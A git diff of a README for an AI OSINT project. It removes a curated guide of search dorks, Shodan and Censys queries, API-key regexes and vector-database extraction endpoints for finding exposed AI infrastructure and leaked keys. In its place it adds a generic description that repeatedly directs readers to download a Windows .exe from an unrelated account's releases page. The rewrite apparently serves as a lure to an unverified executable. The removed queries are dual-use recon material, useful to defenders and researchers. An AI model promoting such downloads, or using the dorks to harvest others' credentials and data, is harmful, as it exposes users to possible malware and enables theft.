@@ -1,655 +1,106 @@
-<p align="center">
-  <img src="assets/logo.png" alt="AI OSINT" width="400">
-</p>
-
-<h1 align="center">AI OSINT</h1>
-
-<p align="center">
-  <b>Curated OSINT resources for discovering exposed AI infrastructure — dorks, queries, tools, and techniques for LLM, AI agent, and ML pipeline reconnaissance.</b>
-</p>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="MIT"></a>
-  <a href="https://creativecommons.org/licenses/by-sa/4.0/"><img src="https://img.shields.io/badge/Data-CC%20BY--SA%204.0-lightgrey.svg" alt="CC BY-SA 4.0"></a>
-  <img src="https://img.shields.io/badge/Updated-April%202026-blue.svg" alt="Updated">
-  <a href="CONTRIBUTING.md"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs"></a>
-  <img src="https://img.shields.io/github/stars/7WaySecurity/ai_osint?style=social" alt="Stars">
-</p>
-
-<p align="center">
-  <code>`187,000+ Ollama servers exposed`</code> · <code>`370,000+ Grok conversations indexed`</code> · <code>`AI credential leaks up 81% YoY`</code> · <code>`150M+ MCP downloads affected by systemic RCE`</code> · <code>`300K+ ChatGPT creds on dark web`</code>
-</p>
-
----
-
-> **AI OSINT** is a curated collection of Google dorks, Shodan queries, GitHub dorks, Censys queries, Sigma detection rules, threat intelligence, and security tools for finding exposed artificial intelligence infrastructure on the internet. It covers LLM endpoints (Ollama, vLLM, LM Studio), AI chatbot conversation leaks (ChatGPT, Grok, Perplexity), vector databases (Qdrant, Weaviate, ChromaDB, Milvus, Pinecone), AI agent gateways (OpenClaw, MCP servers), MLOps platforms (MLflow, Jupyter, Kubeflow), leaked AI API keys (OpenAI, Anthropic, Google Gemini, HuggingFace, Groq, Replicate, Cohere, Mistral, DeepSeek, ElevenLabs), and AI image generation services (Stable Diffusion, ComfyUI). Designed for Red Team operators, penetration testers, bug bounty hunters, and OSINT researchers working in AI/ML security.
-
-It now also covers MCP supply chain attacks (systemic STDIO RCE, marketplace poisoning), AI IDE exploitation (Copilot YOLO mode, Windsurf zero-click), AI model leak incidents (Claude Code source map, DeepSeek ClickHouse exposure), AI-assisted vulnerability discovery (Mythos/Glasswing), and ChatGPT data exfiltration techniques.
-
----
-
-## Why This Exists
-
-Organizations are deploying LLMs, vector databases, and AI agents faster than they can secure them. The result:
-
-- **Ollama, vLLM, Gradio** — shipped with zero authentication by default
-- **ChatGPT, Grok** — shared conversations indexed by search engines with API keys, passwords, PII
-- **MCP servers** — exposed agent gateways with shell access, file system access, and stored credentials
-- **Qdrant, ChromaDB, MLflow** — no auth out of the box, exposing embeddings, models, and experiments
-- **AI IDEs (Copilot, Cursor, Windsurf)** — prompt injection enables YOLO mode activation, wormable RCE across developer workstations
-- **MCP supply chain** — 9 of 11 MCP marketplaces poisoned in proof-of-concept; 150M+ downloads affected by systemic RCE
-- **AI code execution sandboxes** — DNS side channels bypass outbound network guardrails, enabling silent data exfiltration
-
-This repository gives Red Team operators and OSINT professionals the exact queries to find it all.
-
-**Inspired by:** [7WaySecurity/cloud_osint](https://github.com/7WaySecurity/cloud_osint)
-
----
-
-## 📋 Table of Contents
-
-| Section | What You'll Find |
-|---|---|
-| [Google Dorks](#-google-dorks) | Queries for ChatGPT, Grok, HuggingFace, dashboards, config files |
-| [GitHub Dorks](#-github-dorks) | Leaked API keys for 20+ AI providers, MCP configs, system prompts |
-| [Shodan Queries](#-shodan-queries) | Ollama, vLLM, OpenClaw, Gradio, vector DBs, MLflow, Jupyter |
-| [Censys Queries](#-censys-queries) | Alternative engine queries for all AI services |
-| [AI Service Endpoints](#-ai-service-endpoints) | URL patterns, default ports, API fingerprinting |
-| [API Key Patterns](#-api-key-patterns) | Prefixes, regex, validation for every major AI provider |
-| [Vector DB Recon](#-vector-database-reconnaissance) | Endpoints to enumerate Qdrant, Weaviate, ChromaDB, Milvus |
-| [MCP & Agent Exposure](#-mcp--ai-agent-exposure) | The most critical emerging attack surface in AI security |
-| [Threat Intelligence](#-threat-intelligence) | Operation Bizarre Bazaar, Clawdbot crisis, MCP supply chain |
-| [Tools](#-tools) | AI-specific only — scanners, red team frameworks, key detectors |
-| [Detection Rules](#-detection-rules) | Sigma rules for monitoring AI infrastructure |
-
----
-
-## 🔍 Google Dorks
-
-> Full collection: [`dorks/google/`](dorks/google/AI_GOOGLE_DORKS.md)
-
-### Exposed AI Conversations & Credentials
-
-```
-# Grok (xAI) — 370K+ conversations indexed, NO opt-out for indexing
-site:grok.com/share "password"
-site:grok.com/share "API key"
-site:grok.com/share "secret"
-site:grok.com/share "token"
-site:grok.com/share "credentials"
-site:grok.com/share "keyword"
-
-# ChatGPT — Feature removed Aug 2025, cached results diminishing
-# Try on DuckDuckGo which continued indexing after Google stopped
-site:chatgpt.com/share "API key"
-site:chatgpt.com/share "sk-proj"
-site:chatgpt.com/share "password"
-site:chatgpt.com/share "AWS_SECRET"
-
-# Perplexity AI
-site:perplexity.ai/search "API key"
-site:perplexity.ai/search "password"
-
-# Claude (Anthropic) — ~600 convos indexed by Google, 143K+ on Archive.org
-# 🔥 Original dork by 7WaySecurity
-site:claude.ai "public/artifacts"
-site:claude.ai/share "API key"
-site:claude.ai/share "sk-ant"
-site:claude.ai/share "password"
-site:claude.ai/share "AWS"
-site:claude.ai/share ".env"
-site:web.archive.org "claude.ai/share"
-
-# HuggingFace Spaces — keys hardcoded in public Git repos
-site:huggingface.co/spaces "sk-proj"
-site:huggingface.co/spaces "OPENAI_API_KEY"
-site:huggingface.co/spaces "os.environ"
-site:huggingface.co/spaces "st.secrets"
-```
-
-### Exposed AI Dashboards
-
-```
-intitle:"MLflow" inurl:"/mlflow"
-intitle:"Label Studio" inurl:"/projects"
-intitle:"Jupyter Notebook" inurl:"/tree" -"Login"
-intitle:"Kubeflow" inurl:"/pipeline"
-intitle:"Airflow - DAGs"
-intitle:"Gradio" inurl:":7860"
-intitle:"Streamlit" inurl:":8501"
-intitle:"Open WebUI" "ollama"
-intitle:"Qdrant Dashboard"
-intitle:"ComfyUI"
-intitle:"Stable Diffusion"
-intitle:"LiteLLM" "proxy"
-```
-
-### AI Config & Credential Files
-
-```
-filetype:env "OPENAI_API_KEY"
-filetype:env "ANTHROPIC_API_KEY"
-filetype:env "HUGGINGFACE_TOKEN"
-filetype:env "GROQ_API_KEY"
-filetype:env "PINECONE_API_KEY"
-filetype:env "WANDB_API_KEY"
-filetype:env "DEEPSEEK_API_KEY"
-filetype:env "OPENROUTER_API_KEY"
-filetype:yaml "openai" "api_key"
-filetype:json "anthropic" "api_key"
-```
-
-### MCP Server Config Exposure (v1.2.0)
-
-```
-# MCP server configs with embedded secrets (systemic RCE — Ox Security, April 2026)
-site:github.com "mcpServers" "args" filetype:json
-site:github.com "mcp.config" "apiKey"
-site:github.com ".cursor" "mcpServers" filetype:json
-site:github.com "windsurf" "mcp" "config" filetype:json
-
-# Claude Code leak artifacts
-site:github.com "claude-code" "leaked" "source"
-
-# VS Code YOLO mode (CVE-2025-53773)
-site:github.com "chat.tools.autoApprove" "true" filetype:json
-```
----
-
-## 🐙 GitHub Dorks
-
-> Full collection: [`dorks/github/`](dorks/github/AI_GITHUB_DORKS.md)
->
-> ⚠️ **Syntax note:** GitHub migrated to new Code Search. Use `path:*.env` instead of legacy `filename:.env`. Queries below use modern syntax where applicable.
-
-### AI API Keys on GitHub
-
-```
-# OpenAI (project keys — current format since April 2024)
-"sk-proj-" path:*.env
-"sk-proj-" path:*.py
-"OPENAI_API_KEY" path:*.env NOT "your_key" NOT "example"
-
-# Anthropic
-"sk-ant-api03" path:*.env
-"ANTHROPIC_API_KEY" path:*.env
-
-# Google AI / Gemini
-"AIzaSy" path:*.env "generativelanguage"
-"GOOGLE_API_KEY" path:*.env "gemini"
-
-# HuggingFace
-"hf_" path:*.env
-"HF_TOKEN" path:*.env
-
-# Groq
-"gsk_" path:*.env
-"GROQ_API_KEY" path:*.env
-
-# Replicate
-"r8_" path:*.env
-"REPLICATE_API_TOKEN" path:*.env
-
-# Vector DBs & MLOps
-"PINECONE_API_KEY" path:*.env
-"QDRANT_API_KEY" path:*.env
-"WANDB_API_KEY" path:*.env
-```
-
-### MCP & Agent Config Leaks
-
-```
-path:mcp.json "api_key"
-path:mcp.json "token"
-path:.cursor/mcp.json
-"mcpServers" path:*.json "apiKey"
-"mcpServers" path:*.json "OPENAI_API_KEY"
-```
-
-### System Prompts & Training Data
-
-```
-"system_prompt" path:*.py "you are"
-"SYSTEM_PROMPT" path:*.env
-path:prompts.yaml "system"
-path:train.jsonl "prompt" "completion"
-path:dataset.jsonl "instruction" "output"
-```
-
-### MCP & AI IDE Config Exploitation (v1.2.0)
-
-```
-# MCP STDIO configs (systemic RCE — 10+ CVEs)
-path:*.json "mcpServers" "command" "args"
-path:.vscode/settings.json "chat.tools.autoApprove" "true"
-
-# Claude Code attack vectors
-"CLAUDE.md" "permission" "allow"
-
-# DeepSeek keys
-path:*.env "DEEPSEEK_API_KEY"
-"DEEPSEEK_API_KEY" NOT "your_key" NOT "example"
-```
----
-
-## 🔭 Shodan Queries
-
-> Full collection: [`dorks/shodan/`](dorks/shodan/AI_SHODAN_DORKS.md)
-
-### Self-Hosted LLMs
-
-```
-# Ollama — 240,000+ exposed instances worldwide
-port:11434 product:"Ollama"
-port:11434 http.html:"Ollama"
-port:11434 "api/tags"
-
-# vLLM / OpenAI-compatible
-port:8000 "openai" "model"
-http.title:"FastAPI" port:8000 "/v1/models"
-
-# LM Studio
-port:1234 "/v1/models"
-
-# llama.cpp
-port:8080 "llama" "completion"
-```
-
-### AI Agent Gateways — CRITICAL
-
-```
-# OpenClaw/Clawdbot — 4,000+ on Shodan, many with zero auth
-# Enables RCE via prompt injection, API key theft, reverse shells
-http.title:"Clawdbot Control" port:18789
-http.title:"OpenClaw" port:18789
-port:18789 "api/v1/status"
-port:18789 "auth_mode"
-```
-
-### Gradio & Streamlit Apps
-
-```
-http.title:"Gradio" port:7860
-http.title:"Streamlit" port:8501
-http.title:"Stable Diffusion" port:7860
-http.title:"ComfyUI"
-```
+# 🔍 ai_osint - Find exposed artificial intelligence assets quickly
 
-### Vector Databases
+[![Download ai_osint](https://img.shields.io/badge/Download-ai_osint-blue)](https://github.com/exact-treesquirrel5419/ai_osint/releases)
 
-```
-# Qdrant — NO auth by default
-port:6333 "qdrant"
-port:6333 "/collections"
+This software helps you find exposed artificial intelligence resources. It allows you to search for open endpoints and leaked keys. You can use these tools to secure your own projects or find bugs in systems.
 
-# Weaviate
-port:8080 "weaviate"
+## 📋 What this tool does
 
-# Milvus
-port:19530 "milvus"
-```
+Modern artificial intelligence systems often have weak spots. Developers sometimes leave API keys in public view or forget to secure their databases. This application provides a set of tools to identify these risks. It gathers techniques for scanning systems for vulnerabilities.
 
-### MLOps & Notebooks
+You can use the tool to perform the following actions:
 
-```
-# MLflow — CVE-2026-0545 (CVSS 9.1) RCE, no auth by default
-http.title:"MLflow" port:5000
-
-# Jupyter — ~10,000+ on Shodan, targeted by botnets
-http.title:"Jupyter Notebook" port:8888 -"Login"
-http.title:"JupyterLab" port:8888
+*   Generate Google dorks to find open files.
+*   Construct Shodan queries to locate public sensors.
+*   Identify leaked API keys in exposed repositories.
+*   Scan for misconfigured vector databases.
+*   Verify the security of AI agents.
+*   Test for common vulnerabilities like prompt injection.
 
-# TensorBoard
-http.title:"TensorBoard" port:6006
-```
-
-### MCP & AI Agent Gateways (v1.2.0)
-
-```
-# MCP endpoints (systemic RCE — Ox Security)
-http.html:"mcp" "tools" port:3000
-http.html:"Model Context Protocol" port:8080
-
-# nginx-ui MCP (CVE-2026-33032 — actively exploited, CVSS 9.8)
-http.title:"Nginx UI" port:443
-
-# Flowise (CVE-2026-40933)
-http.title:"Flowise" port:3000
-
-# vLLM (LLMjacking target)
-http.html:"vLLM" port:8000
-
-# Open WebUI
-http.title:"Open WebUI" port:3000
-
-# LiteLLM Proxy
-http.title:"LiteLLM" port:4000
-
-# DeepSeek-style ClickHouse exposure
-product:"ClickHouse" port:8123
-```
----
-
-## 🌐 Censys Queries
-
-> Full collection: [`dorks/censys/`](dorks/censys/AI_CENSYS_QUERIES.md)
-
-```
-# Ollama (Censys found 25%+ on non-default ports)
-services.port=11434 AND services.http.response.body:"Ollama"
-
-# Gradio
-services.port=7860 AND services.http.response.html_title:"Gradio"
-
-# OpenClaw
-services.port=18789 AND services.http.response.body:"Clawdbot"
-
-# Vector DBs
-services.port=6333 AND services.http.response.body:"qdrant"
-services.port=8080 AND services.http.response.body:"weaviate"
-
-# MLOps
-services.port=5000 AND services.http.response.html_title:"MLflow"
-services.port=8888 AND services.http.response.html_title:"Jupyter"
-
-### MCP & New AI Infrastructure (v1.2.0)
-
-# MCP endpoints
-services.http.response.body:"Model Context Protocol" AND services.port=3000
-
-# Flowise (CVE-2026-40933)
-services.http.response.html_title:"Flowise" AND services.port=3000
-
-# vLLM (LLMjacking target)
-services.http.response.body:"vLLM" AND services.port=8000
-
-# nginx-ui MCP (CVE-2026-33032 — actively exploited)
-services.http.response.html_title:"Nginx UI" AND services.port=443
-
-# ClickHouse exposure (DeepSeek-style)
-services.port=8123 AND services.http.response.body:"ClickHouse"
-
-# Open WebUI
-services.http.response.html_title:"Open WebUI"
-
-# LiteLLM
-services.http.response.html_title:"LiteLLM"
-```
-
----
-
-## 🌍 AI Service Endpoints
-
-### Major Provider APIs
+## 💻 System requirements
 
-| Provider | API Endpoint | Shared Content |
-|---|---|---|
-| **OpenAI** | `api.openai.com/v1/*` | `chatgpt.com/share/*` |
-| **Anthropic** | `api.anthropic.com/v1/*` | — |
-| **Google** | `generativelanguage.googleapis.com/v1beta/*` | — |
-| **xAI** | `api.x.ai/v1/*` | `grok.com/share/*` |
-| **Mistral** | `api.mistral.ai/v1/*` | — |
-| **Cohere** | `api.cohere.ai/v1/*` | — |
-| **DeepSeek** | `api.deepseek.com/v1/*` | — |
-| **Groq** | `api.groq.com/openai/v1/*` | — |
-| **HuggingFace** | `api-inference.huggingface.co/models/*` | `huggingface.co/spaces/*` |
-| **ElevenLabs** | `api.elevenlabs.io/v1/*` | — |
+The software runs on Windows. Your computer needs the following specifications:
 
-### Default Ports (all verified against official docs)
+*   Windows 10 or Windows 11.
+*   At least 4 gigabytes of RAM.
+*   A stable internet connection.
+*   A modern web browser for checking links.
 
-| Service | Port | Auth Default | Risk Level |
-|---|---|---|---|
-| **Ollama** | 11434 | ❌ None | 🔴 Critical |
-| **vLLM** | 8000 | ❌ None | 🔴 Critical |
-| **OpenClaw** | 18789 | ❌ None (fixed in rebrand) | 🔴 Critical |
-| **Gradio** | 7860 | ❌ None | 🔴 Critical |
-| **Streamlit** | 8501 | ❌ None | 🟡 High |
-| **MLflow** | 5000 | ❌ None | 🔴 Critical |
-| **Qdrant** | 6333/6334 | ❌ None | 🔴 Critical |
-| **Weaviate** | 8080 (+ gRPC 50051) | ❌ None | 🟡 High |
-| **ChromaDB** | 8000 | ❌ None (binds localhost) | 🟡 High |
-| **Milvus** | 19530 (+ mgmt 9091) | ❌ None | 🟡 High |
-| **Jupyter** | 8888 | ✅ Token (often disabled) | 🟡 High |
-| **LM Studio** | 1234 | ❌ None | 🟡 High |
-| **GPT4All** | 4891 | ❌ None | 🟡 High |
-| **Flowise** | 3000 | ❌ None | 🔴 Critical |
-| **LiteLLM Proxy** | 4000 | ❌ None | 🔴 Critical |
-| **Open WebUI** | 3000/8080 | ✅ Auth (default) | 🟡 High |
-| **nginx-ui** | 443/9000 | ✅ Auth (bypassable) | 🔴 Critical |
-| **ClickHouse** | 8123/9000 | ❌ None | 🔴 Critical |
-| **TGI (HuggingFace)** | 8080 | ❌ None | 🟡 High |
----
-
-## 🔑 API Key Patterns
-
-### Prefix Reference (verified against official docs)
-
-| Provider | Prefix | Length | Notes |
-|---|---|---|---|
-| **OpenAI** | `sk-proj-` | ~80+ chars | Current format since April 2024 |
-| **Anthropic** | `sk-ant-api03-` | ~90+ chars | API keys |
-| **Anthropic OAuth** | `sk-ant-oat01-` | — | OAuth tokens (Files API, etc.) |
-| **Google AI** | `AIzaSy` | 39 chars | ⚠️ Same prefix for Maps AND Gemini |
-| **HuggingFace** | `hf_` | ~34 chars | Read/write access tokens |
-| **Replicate** | `r8_` | ~40 chars | — |
-| **Groq** | `gsk_` | ~52 chars | — |
-
-### Regex for Detection
-
-```regex
-# OpenAI project keys
-sk-proj-[A-Za-z0-9_-]{80,}
-
-# Anthropic
-sk-ant-api03-[A-Za-z0-9_-]{90,}
-
-# HuggingFace
-hf_[A-Za-z0-9]{34}
-
-# Replicate
-r8_[A-Za-z0-9]{37}
-
-# Groq
-gsk_[A-Za-z0-9]{52}
-
-# Google AI (⚠️ also matches Maps, YouTube, etc.)
-AIzaSy[A-Za-z0-9_-]{33}
-```
-
-> ⚠️ **Google `AIzaSy` warning:** Google uses the same prefix for ALL Cloud APIs. A Maps API key embedded in public JavaScript can silently gain Gemini API access if the Generative Language API is enabled on the same project. This was documented as a significant issue in early 2026.
-
----
-
-## 🗃️ Vector Database Reconnaissance
-
-When exposed, vector databases leak proprietary embeddings, sensitive documents, and internal knowledge bases used in RAG systems.
-
-### Enumeration Endpoints (verified against official API docs)
-
-| Database | List Collections | Extract Data |
-|---|---|---|
-| **Qdrant** | `GET /collections` | `POST /collections/{name}/points/scroll` |
-| **Weaviate** | `GET /v1/schema` | `GET /v1/objects?class={name}` |
-| **ChromaDB** | `GET /api/v2/collections` ⚠️ | `POST /api/v2/collections/{id}/query` |
-| **Milvus** | gRPC `ListCollections` | gRPC `Search/Query` |
-
-> ⚠️ **ChromaDB API update:** v1.0.0+ migrated to `/api/v2`. The legacy `/api/v1/collections` now returns a deprecation error. Update your recon scripts accordingly.
-
----
-
-## 🤖 MCP & AI Agent Exposure
-
-The **Model Context Protocol (MCP)** is the most critical emerging attack surface in AI security (2025-2026).
-
-### Why MCP is Dangerous
-
-MCP servers connect AI models to shell access, file systems, databases, and APIs. Misconfigurations expose:
-- **Shell/code execution** via prompt injection
-- **API keys in plaintext** in `.env` files readable by agents
-- **Tool poisoning** — hidden instructions in tool metadata
-- **Supply chain attacks** — compromised MCP packages (24,000+ secrets leaked in MCP configs in its first year)
-
-### Discovery Queries
-
-```
-# Shodan
-port:18789 "api/v1"
-http.title:"Clawdbot" OR http.title:"OpenClaw"
-
-# GitHub
-path:mcp.json "apiKey"
-path:.cursor/mcp.json
-"mcpServers" path:*.json "token"
-```
-
-### Key Incidents
-
-| Incident | Date | Impact |
-|---|---|---|
-| OpenClaw Shodan Exposure | Jan 2026 | 4,000+ agent gateways, many with zero auth and RCE |
-| Operation Bizarre Bazaar | Dec 2025–Jan 2026 | 35,000 attacks on LLM/MCP endpoints; commercial resale |
-| Smithery Registry Breach | 2025 | Fly.io token → control of 3,000+ MCP servers |
-| mcp-remote CVE-2025-6514 | 2025 | Command injection in 437K+ installs |
-| Cursor IDE MCP Trust Issue | 2025 | Persistent RCE via shared repo configs (CVSS 7.2-8.8) |
-| MCP Systemic RCE (Ox Security) | Apr 2026 | 150M+ downloads, 200K servers, 10+ CVEs, 9/11 marketplaces poisoned |
-| nginx-ui MCPwn (CVE-2026-33032) | Mar 2026 | CVSS 9.8, actively exploited, full Nginx takeover in 2 requests |
-| Atlassian MCPwnfluence | Apr 2026 | CVE-2026-27825/27826 — RCE chain from LAN, no auth required |
-| MCP TypeScript SDK Data Leak | Apr 2026 | CVE-2026-25536 — cross-client data leak in shared McpServer instances |
-| Windsurf Zero-Click RCE | Apr 2026 | CVE-2026-30615 — zero-click prompt injection → local RCE via MCP |
-
-> 📖 Full timeline: [`threat-intel/THREAT_INTELLIGENCE.md`](threat-intel/THREAT_INTELLIGENCE.md)
-
----
-
-## 📊 Threat Intelligence
-
-> Full entries: [`threat-intel/`](threat-intel/THREAT_INTELLIGENCE.md)
-
-- **Operation Bizarre Bazaar** — First large-scale LLMjacking: 35K attacks, commercial marketplace selling stolen AI access
-- **OpenClaw/Clawdbot Shodan Crisis** — CVE-2026-24061, "Localhost Trust" bypass
-- **ChatGPT/Grok Conversation Indexing** — Google indexed thousands of conversations with credentials
-- **Claude Conversation Indexing** — ~600 conversations indexed by Google (Forbes Sep 2025); 143K+ across all LLMs on Archive.org
-- **"Claudy Day" Attack Chain** — Open redirect + prompt injection + Files API exfiltration in claude.ai (Oasis Security, Mar 2026)
-- **Claude Code Source Map Leak** — 512K lines of source code exposed via npm package v2.1.88 (Mar 2026)
-- **MCP Supply Chain Timeline** — 10+ major breaches in MCP ecosystem
-- **175K Ollama Servers Exposed** — SentinelOne/Censys study across 130 countries
-- **AI-Assisted ICS Targeting** — 60+ Iranian groups using LLMs for critical infrastructure recon (Feb 2026)
-- **Claude Mythos Preview / Project Glasswing** — Anthropic's unreleased model autonomously discovered thousands of 0-days in major OS/browsers. Limited to ~50 organizations. CVE-2026-4747 (OpenBSD 27-year RCE).
-- **Claude Code Source Leak** — 59.8 MB source map published to npm (Mar 31, 2026). Critical 50-subcommand bypass vulnerability. Fake repos distributing Vidar/GhostSocks malware.
-- **MCP "Mother of All Supply Chains"** — Ox Security found architectural RCE in MCP SDKs: 150M+ downloads, 10+ CVEs, 9/11 marketplaces poisoned. Anthropic declined protocol fix.
-- **ChatGPT DNS Exfiltration** — Check Point discovered silent data leakage via DNS side channel in code execution sandbox. Patched Feb 20, 2026.
-- **CVE-2025-53773: Copilot Wormable RCE** — Prompt injection enables YOLO mode, wormable across repositories. Patched Aug 2025.
-- **OpenAI Codex CLI Command Injection** — Branch injection → lateral movement → codebase access. Patched Feb 2026.
-- **300K+ ChatGPT Credentials on Dark Web** — IBM X-Force 2026: AI chatbot credentials are emerging infostealer target.
-- **Ollama: 12,269 More Exposed** — LeakIX found additional exposed instances; maintainers continue rejecting auth PRs.
-- **nginx-ui MCPwn** — CVE-2026-33032 actively exploited. Full Nginx takeover in 2 HTTP requests.
-- **DeepSeek ClickHouse Exposure** — Wiz found 1M+ log entries with plaintext chats, API keys, backend details (Jan 2025).
-
----
-
-## 🛠️ Tools
-
-> Only AI-specific tools. Full details: [`tools/TOOLS.md`](tools/TOOLS.md)
-> For generic OSINT tools (Shodan, Censys, etc.) see [cloud_osint](https://github.com/7WaySecurity/cloud_osint).
-
-| Tool | What It Does | By |
-|---|---|---|
-| [**Garak**](https://github.com/NVIDIA/garak) | LLM vulnerability scanner — "nmap for LLMs" | NVIDIA |
-| [**PyRIT**](https://github.com/microsoft/PyRIT) | AI red teaming framework — Crescendo, jailbreaking, multi-turn | Microsoft |
-| [**promptfoo**](https://github.com/promptfoo/promptfoo) | LLM pentesting CLI — 133+ attack plugins | OpenAI |
-| [**DeepTeam**](https://github.com/confident-ai/deepteam) | 50+ vulns, 20+ attacks, OWASP/MITRE mapping | Confident AI |
-| [**API Radar**](https://apiradar.live/) | Real-time leaked AI API key monitoring on GitHub | Independent |
-| [**KeyLeak Detector**](https://github.com/Amal-David/keyleak-detector) | Web scanner for 200+ patterns incl. 15+ AI providers | Independent |
-| [**promptmap**](https://github.com/utkusen/promptmap) | ChatGPT dorks & prompt injection testing | Utku Şen |
-| [**Vulnerable MCP**](https://vulnerablemcp.info/) | MCP vulnerability database with CVEs and PoCs | Community |
-| [**MCPSafetyScanner**](https://github.com/johnhalloran321/mcpSafetyScanner) | MCP server security auditing tool | Academic (Leidos) |
-| [**Cisco AI Supply Chain Scanners**](https://blogs.cisco.com/ai/cisco-state-of-ai-security-2026-report) | Scanners for MCP, A2A, pickle files, agentic skill files | Cisco Talos |
-| [**DorkEye**](https://github.com/search?q=DorkEye+OSINT) | Automated Google Dorking with multi-agent analysis pipeline | Open Source |
-
----
-
-## 🚨 Detection Rules
-
-> Full Sigma rules: [`detection-rules/SIGMA_RULES.md`](detection-rules/SIGMA_RULES.md)
-
-12 Sigma detection rules covering:
-- External access to Ollama (port 11434)
-- AI API keys appearing in application logs
-- Unauthorized LLM API access without Bearer tokens
-- Exposed MCP servers with `auth_mode: none`
-- Vector database unauthorized enumeration
-- LLMjacking — anomalous inference spikes (>500 requests/hour)
-- AI agent RCE via prompt injection (suspicious tool calls to bash/python_repl)
-- MCP STDIO arbitrary command execution (CVE-2026-30615/30624/30616/40933)
-- VS Code Copilot YOLO mode activation (CVE-2025-53773)
-- nginx-ui MCP endpoint unauthenticated access (CVE-2026-33032, actively exploited)
-- DNS-based data exfiltration from AI code execution sandboxes
-- Claude Code 50+ subcommand pipeline deny rule bypass
-
----
-
-## 📚 References
-
-### Research
-
-| Source | Finding | Link |
-|---|---|---|
-| SentinelOne + Censys | 175,108 exposed Ollama hosts across 130 countries | [SecurityWeek](https://www.securityweek.com/175000-exposed-ollama-hosts-could-enable-llm-abuse/) |
-| Cisco Talos | 1,100+ Ollama servers, 20% serving models without auth | [Cisco Blog](https://blogs.cisco.com/security/detecting-exposed-llm-servers-shodan-case-study-on-ollama) |
-| Pillar Security | Operation Bizarre Bazaar: 35,000 LLMjacking attacks | [Pillar Security](https://www.pillar.security/) |
-| GitGuardian | AI credential leaks surged 81% YoY; 29M secrets on GitHub | [Report](https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/) |
-| AuthZed | Complete MCP security breaches timeline | [Blog](https://authzed.com/blog/timeline-mcp-breaches) |
-| Pangea | Sensitive data in indexed ChatGPT histories | [Blog](https://pangea.cloud/blog/mining-the-index-uncovering-sensitive-data-in-public-chatgpt-histories-via-google-search/) |
-| Trail of Bits | 8 high-severity vulns in Gradio 5 audit | [Blog](https://blog.trailofbits.com/2024/10/10/auditing-gradio-5-hugging-faces-ml-gui-framework/) |
-| Oasis Security | "Claudy Day" — 3 vulns chained for data exfiltration from Claude | [Blog](https://www.oasis.security/blog/claude-ai-prompt-injection-data-exfiltration-vulnerability) |
-| Forbes | ~600 Claude conversations indexed by Google | [Article](https://www.forbes.com/sites/iainmartin/2025/09/08/hundreds-of-anthropic-chatbot-transcripts-showed-up-in-google-search/) |
-| Obsidian Security | 143K+ LLM chats (incl. Claude) on Archive.org | [Blog](https://www.obsidiansecurity.com/resource/143k-claude-copilot-chatgpt-chats-publicly-accessible-were-you-exposed) |
-| TechRadar | Claude Code 512K source lines leaked via npm | [Article](https://www.techradar.com/pro/security/anthropic-confirms-it-leaked-512-000-lines-of-claude-code-source-code-spilling-some-of-its-biggest-secrets) |
-| Penligent | Claude Code source map leak analysis | [Blog](https://www.penligent.ai/hackinglabs/claude-code-source-map-leak-what-was-exposed-and-what-it-means/) |
-| Ox Security | 150M+ MCP downloads affected by systemic RCE, 10+ CVEs, 9/11 marketplaces poisoned | [Blog](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/) |
-| Anthropic Red Team | Claude Mythos: thousands of 0-days, CVE-2026-4747, sandbox escape | [red.anthropic.com](https://red.anthropic.com/2026/mythos-preview/) |
-| IBM X-Force | 300K+ ChatGPT creds on dark web, supply chain attacks 4x in 5 years | [Report](https://www.ibm.com/think/insights/more-2026-cyberthreat-trends) |
-| Check Point | ChatGPT DNS exfiltration — silent data leakage via side channel | [Blog](https://blog.checkpoint.com/research/when-ai-trust-breaks-the-chatgpt-data-leakage-flaw-that-redefined-ai-vendor-security-trust/) |
-| Zscaler ThreatLabz | Claude Code source leak + Vidar/GhostSocks malware lure | [Blog](https://www.zscaler.com/blogs/security-research/anthropic-claude-code-leak) |
-| Cisco AI | State of AI Security 2026 — MCP, A2A, agentic AI scanners | [Report](https://blogs.cisco.com/ai/cisco-state-of-ai-security-2026-report) |
-| LeakIX | 12,269 additional exposed Ollama instances, auth PR rejection critique | [Blog](https://blog.leakix.net/2026/02/ollama-exposed/) |
-| CSA | Time-to-exploit now under 20 hours (Mythos briefing) | [HelpNetSecurity](https://www.helpnetsecurity.com/2026/04/15/anthropic-claude-mythos-ai-vulnerability-discovery/) |
-| Wiz | Claude Mythos practical guidance — "Y2K moment" for cybersecurity | [Blog](https://www.wiz.io/blog/claude-mythos) |
-| Wiz | DeepSeek ClickHouse exposure — 1M+ log entries with plaintext chats | [Blog](https://www.wiz.io/blog/wiz-research-uncovers-exposed-deepseek-database-leak) |
-
-### Standards
-
-- [OWASP Top 10 for LLM Applications 2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
-- [OWASP Top 10 for Agentic Applications 2026](https://owasp.org/www-project-top-10-for-agentic-applications/)
-- [MITRE ATLAS](https://atlas.mitre.org/)
-- [MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
-- [vulnerablemcp.info](https://vulnerablemcp.info/)
-
----
-
-## ⚠️ Disclaimer
-
-The resources in this repository are for **authorized security testing, education, and legitimate research only**.
-
-1. **Obtain proper authorization** before testing infrastructure you do not own
-2. **Follow applicable laws** (CFAA, GDPR, local equivalents)
-3. **Report vulnerabilities responsibly** through appropriate disclosure channels
-4. **Never exploit** discovered misconfigurations for unauthorized access
-
-The authors assume no liability for misuse.
-
----
-
-## 🤝 Contributing
-
-PRs welcome! Please verify dorks/queries work before submitting. See [CONTRIBUTING.md](CONTRIBUTING.md).
-
----
-
-## License
-
-Code: [MIT](LICENSE) · Data & Documentation: [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/)
-
----
-
-<p align="center"><b>Maintained by <a href="https://7waysecurity.co">7WaySecurity</a></b> · Last updated April 2026</p>
+You do not need to install complex compilers or manage code environments. The tool performs the heavy lifting for you through a simple interface.
+
+## 🚀 Getting the software
+
+You need to download the latest version from the official release page. A release contains the pre-built files that your computer understands.
+
+[Visit this page to download the software.](https://github.com/exact-treesquirrel5419/ai_osint/releases)
+
+Follow these steps to set up the tool:
+
+1.  Click the link above.
+2.  Look for the section labeled "Assets."
+3.  Choose the file ending in .exe for Windows.
